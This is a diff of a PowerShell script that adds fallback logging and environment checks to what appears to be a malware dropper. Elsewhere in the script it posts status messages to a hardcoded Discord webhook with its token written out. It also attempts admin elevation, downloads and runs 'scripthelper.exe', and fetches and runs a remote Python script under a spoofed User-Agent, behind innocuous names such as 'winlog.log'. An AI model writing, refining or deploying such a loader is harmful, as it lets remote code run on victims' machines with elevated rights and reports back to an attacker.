@@ -1,22 +1,39 @@
 # Initialize variables
 $webhookUrl = "https://discord.com/api/webhooks/1410962330300321834/9siRJ2eeQ-3gaV1Ma3r7akXbqZfdHrYG8owFAmySTUkdVVrH8pTFIehfXk87z9A9HuzR"
 $logPath = Join-Path $env:USERPROFILE "Documents\winlog.log"
+$fallbackLogPath = Join-Path $env:TEMP "winlog_fallback.log"
 
-# Function to send log to webhook and file with rate limit handling
+# Function to send log to webhook, primary file, and fallback file
 function Send-Log {
     param (
         [string]$message
     )
-    # Log to file
+    $timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
+    $logMessage = "[$timestamp] $message"
+
+    # Log to primary file
     try {
-        "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $message" | Out-File -FilePath $logPath -Append -ErrorAction Stop
+        $logMessage | Out-File -FilePath $logPath -Append -ErrorAction Stop
     }
     catch {
-        Write-Error "Failed to write to log file: $_"
+        try {
+            "[$timestamp] Failed to write to primary log ($logPath): $($_.Exception.Message)" | Out-File -FilePath $fallbackLogPath -Append
+        }
+        catch {
+            Write-Error "Failed to write to both primary and fallback logs: $_"
+        }
+    }
+
+    # Log to fallback file for redundancy
+    try {
+        $logMessage | Out-File -FilePath $fallbackLogPath -Append -ErrorAction Stop
+    }
+    catch {
+        Write-Error "Failed to write to fallback log ($fallbackLogPath): $_"
     }
 
     # Log to webhook
-    $body = @{ content = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $message" } | ConvertTo-Json
+    $body = @{ content = $logMessage } | ConvertTo-Json
     $attempt = 0
     $success = $false
     while (-not $success -and $attempt -lt 3) {
@@ -28,10 +45,11 @@ function Send-Log {
             $attempt++
             $errorDetails = "Webhook attempt $attempt failed: $($_.Exception.Message)"
             try {
-                "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $errorDetails" | Out-File -FilePath $logPath -Append
+                "[$timestamp] $errorDetails" | Out-File -FilePath $logPath -Append
+                "[$timestamp] $errorDetails" | Out-File -FilePath $fallbackLogPath -Append
             }
             catch {
-                Write-Error "Failed to log webhook error to file: $_"
+                Write-Error "Failed to log webhook error: $_"
             }
             if ($_.Exception.Response.StatusCode -eq 429) {
                 $retryAfter = [int]$_.Exception.Response.Headers['Retry-After']
@@ -47,10 +65,11 @@ function Send-Log {
             }
             if ($attempt -eq 3) {
                 try {
-                    "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to send webhook message after 3 attempts: $_" | Out-File -FilePath $logPath -Append
+                    "[$timestamp] Failed to send webhook message after 3 attempts: $($_.Exception.Message)" | Out-File -FilePath $logPath -Append
+                    "[$timestamp] Failed to send webhook message after 3 attempts: $($_.Exception.Message)" | Out-File -FilePath $fallbackLogPath -Append
                 }
                 catch {
-                    Write-Error "Failed to log final webhook failure to file: $_"
+                    Write-Error "Failed to log final webhook failure: $_"
                 }
             }
         }
@@ -59,6 +78,34 @@ function Send-Log {
 
 # Log script start
 Send-Log "Script started"
+
+# Validate environment
+try {
+    Send-Log "Checking write access to Documents folder"
+    "Test" | Out-File -FilePath (Join-Path $env:USERPROFILE "Documents\test.log") -ErrorAction Stop
+    Remove-Item -Path (Join-Path $env:USERPROFILE "Documents\test.log") -ErrorAction SilentlyContinue
+    Send-Log "Write access to Documents folder confirmed"
+}
+catch {
+    Send-Log "No write access to Documents folder: $($_.Exception.Message)"
+}
+try {
+    Send-Log "Checking write access to TEMP folder"
+    "Test" | Out-File -FilePath (Join-Path $env:TEMP "test.log") -ErrorAction Stop
+    Remove-Item -Path (Join-Path $env:TEMP "test.log") -ErrorAction SilentlyContinue
+    Send-Log "Write access to TEMP folder confirmed"
+}
+catch {
+    Send-Log "No write access to TEMP folder: $($_.Exception.Message)"
+}
+try {
+    Send-Log "Checking network connectivity to webhook"
+    $null = Invoke-WebRequest -Uri $webhookUrl -Method Get -UseBasicParsing -ErrorAction Stop
+    Send-Log "Network connectivity to webhook confirmed"
+}
+catch {
+    Send-Log "No network connectivity to webhook: $($_.Exception.Message)"
+}
 
 # Check if running as admin and attempt elevation
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
@@ -195,7 +242,7 @@ catch {
 # Download and execute scripthelper.exe
 $webClient = $null
 try {
-    Send-Log "Attempting to download and execute $exePath"
+    Send-Log "Attempting to download and execute $exePath from $exeUrl"
     Invoke-Retry {
         $webClient = New-Object System.Net.WebClient
         $webClient.DownloadFile($exeUrl, $exePath)
@@ -224,7 +271,7 @@ try {
     Send-Log "Checking for Python installation"
     $null = python --version 2>&1
     if ($LASTEXITCODE -eq 0) {
-        Send-Log "Python found, attempting to execute Python script"
+        Send-Log "Python found, attempting to execute Python script from $pythonScriptUrl"
         Invoke-Retry {
             $webClient = New-Object System.Net.WebClient
             $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) PowerShell/7.0")
